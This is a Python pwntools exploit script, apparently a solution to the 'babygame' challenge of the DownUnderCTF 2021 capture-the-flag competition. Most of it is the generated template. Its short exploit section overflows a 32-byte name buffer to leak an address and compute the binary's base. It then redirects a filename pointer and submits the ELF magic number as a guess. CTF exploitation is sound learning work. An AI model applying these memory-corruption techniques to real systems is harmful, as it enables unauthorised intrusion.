#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31907 ./babygame
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./babygame')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31907)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *set_username
b *game
b *game+120
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

p ='a'*32
# p += '/dev/null'
io.sendafter("?\n",p)

io.sendafter("> ",'2')

io.recv(32)
leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)
base = leak - 0x2024
name = base +0x40a0


io.sendafter("> ",'1')


# # io.sendafter("> ",'1337')

# # io.sendafter(": ","\x00")


p ='/bin/cat\x00'.ljust(32,"a")
p += p64(name)[:-2]
io.sendafter("?\n",p)

io.sendafter("> ",'1337')

io.sendafter(": ",str(u32("\x7f\x45\x4c\x46")))

io.interactive()

